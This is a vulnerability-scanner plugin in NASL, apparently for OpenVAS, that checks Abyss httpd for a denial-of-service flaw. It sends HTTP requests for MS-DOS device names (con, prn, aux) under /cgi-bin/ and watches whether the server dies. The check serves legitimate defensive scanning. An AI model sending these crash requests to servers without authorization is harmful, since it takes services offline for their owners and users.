# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15563");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"OSVDB", value:"11006");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_name("Abyss httpd DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server to the latest version.");

  script_tag(name:"summary", value:"It was possible to kill the web server by sending a MS-DOS device
  names in an HTTP request.");

  script_tag(name:"impact", value:"An attacker may use this flaw to prevent this host from performing its
  job properly.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );
if( http_is_dead( port:port, retry:4 ) )
  exit( 0 );

foreach dev( make_list( "con", "prn", "aux" ) ) {

  req = string( "GET /cgi-bin/", dev, " HTTP/1.0\r\n",
                "Host: ", get_host_ip(), "\r\n\r\n" );
  http_send_recv( port:port, data:req );
  if( http_is_dead( port:port ) ) {
    security_message( port:port);
    exit( 0 );
  }
}

exit( 99 );
